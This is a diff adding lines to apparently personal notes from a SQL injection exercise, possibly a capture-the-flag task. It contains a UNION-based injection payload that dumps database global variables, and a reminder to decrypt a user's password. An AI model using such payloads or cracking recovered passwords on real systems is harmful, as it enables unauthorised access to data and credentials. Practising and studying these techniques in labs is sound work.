@@ -58,10 +58,25 @@ since we have to return 2 fields for the union to work we use 2 union in the
 
 
 
+!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!
+TODO decrypt pw ! user 5
+!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!
 
 
 
+################################################################################
+9 UNION SELECT VARIABLE_NAME, VARIABLE_VALUE FROM information_schema.GLOBAL_VARIABLES--
+>> global variables ? (see dump_05*)
 
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!
+TODO check for shady shit
+!!!!!!!!!!!!!!!!!!!!!!!!
+!!!!!!!!!!!!!!!!!!!!!!!!
 
 
 
